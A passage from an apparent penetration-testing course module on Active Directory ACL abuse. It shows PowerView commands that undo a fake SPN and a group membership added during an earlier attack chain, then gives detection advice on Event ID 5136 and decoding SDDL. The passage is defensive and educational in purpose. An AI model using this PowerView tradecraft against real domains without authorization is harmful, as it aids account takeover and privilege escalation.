Remove the fake SPN we created on the `adunn` user.\n2. Remove the `damundsen` user from the `Help Desk Level 1` group\n3. Set the password for the `damundsen` user back to its original value (if we know it) or have our client set it/alert the user\n\nThis order is important because if we remove the user from the group first, then we won't have the rights to remove the fake SPN.\n\nFirst, let's remove the fake SPN from the `adunn` account.\n\n#### Removing the Fake SPN from adunn's Account\n\nACL Abuse Tactics\n\n```powershell-session\nPS C:\\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose\n\nVERBOSE: [Get-Domain] Using alternate credentials for Get-Domain\nVERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential\nVERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL\nVERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection\nVERBOSE: [Get-DomainObject] Get-DomainObject filter string:\n(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))\nVERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'\n```\n\nNext, we'll remove the user from the group using the `Remove-DomainGroupMember` function.\n\n#### Removing damundsen from the Help Desk Level 1 Group\n\nACL Abuse Tactics\n\n```powershell-session\nPS C:\\htb> Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose\n\nVERBOSE: [Get-PrincipalContext] Using alternate credentials\nVERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'\nTrue\n```\n\nWe can confirm the user was indeed removed:\n\n#### Confirming damundsen was Removed from the Group\n\nACL Abuse Tactics\n\n```powershell-session\nPS C:\\htb> Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose\n```\n\nEven though we performed as much cleanup as possible, we should still include every modification that we make in our final assessment report. Our client will want to be apprised of any changes within the environment, and recording everything we do during an assessment in writing helps our client and us should questions arise.\n\nThis is just one example attack path. There could be many attack paths in a large domain, some shorter and some more complicated. While this path was fictional for this specific lab environment, I have seen similar attack paths during real-world engagements, and ACL attacks often come into play for furthering access. Sometimes, though, an ACL attack chain may be too time-consuming or potentially destructive, so we may prefer to enumerate the path to present our client with enough evidence to understand the issue and perform remediation.\n\n---\n\n## Detection and Remediation\n\nA few recommendations around ACLs include:\n\n1. `Auditing for and removing dangerous ACLs`\n\nOrganizations should have regular AD audits performed but also train internal staff to run tools such as BloodHound and identify potentially dangerous ACLs that can be removed.\n\n2. `Monitor group membership`\n\nVisibility into important groups is paramount. All high-impact groups in the domain should be monitored to alert IT staff of changes that could be indicative of an ACL attack chain.\n\n3. `Audit and monitor for ACL changes`\n\nEnabling the [Advanced Security Audit Policy](https://docs.microsoft.com/en-us/archive/blogs/canitpro/step-by-step-enabling-advanced-security-audit-policy-via-ds-access) can help in detecting unwanted changes, especially [Event ID 5136: A directory service object was modified](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5136) which would indicate that the domain object was modified, which could be indicative of an ACL attack. If we look at the event log after modifying the ACL of the domain object, we will see some event ID `5136` created:\n\n#### Viewing Event ID 5136\n\n![Windows Event Viewer showing Security log entry for Event ID 5136, indicating a Directory Service change by administrator on 3/24/2022 at 10:53 AM. Audit Success for INLANEFREIGHT.LOCAL domain.](https://academy.hackthebox.com/storage/modules/143/event5136.png)\n\nIf we check out the `Details` tab, we can see that the pertinent information is written in [Security Descriptor Definition Language (SDDL)](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) which is not human readable.\n\n#### Viewing Associated SDDL\n\n![Windows Event Viewer displaying Security log entry for Event ID 5136, showing Directory Service change details with audit success on 3/24/2022 at 10:53 AM.](https://academy.hackthebox.com/storage/modules/143/event5136_sddl.png)\n\nWe can use the [ConvertFrom-SddlString cmdlet](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7.2) to convert this to a readable format.\n\n#### Converting the SDDL String into a Readable Format\n\nACL Abuse Tactics\n\n```powershell-session\nPS C:\\htb> ConvertFrom-SddlString \"O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)\" \n\nOwner            : BUILTIN\\Administrators\nGroup            : BUILTIN\\Administrators\nDiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT\n                   AUTHORITY\\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,\n                   Traverse, WriteExtendedAttributes), NT AUTHORITY\\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed\n                   (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,\n                   WriteExtendedAttributes)...}\nSystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),\n                   BUILTIN\\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), INLANEFREIGHT\\Domain Users:\n                   SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess\n                   (Traverse)...}\nRawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor\n```\n\nIf we choose to filter on the `DiscretionaryAcl` property, we can see that the modification was likely giving the `mrb3n` user `GenericWrite` privileges over the domain object itself, which could be indicative of an attack attempt.\n\nACL Abuse Tactics\n\n```powershell-session\nPS C:\\htb> ConvertFrom-SddlString \"O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00a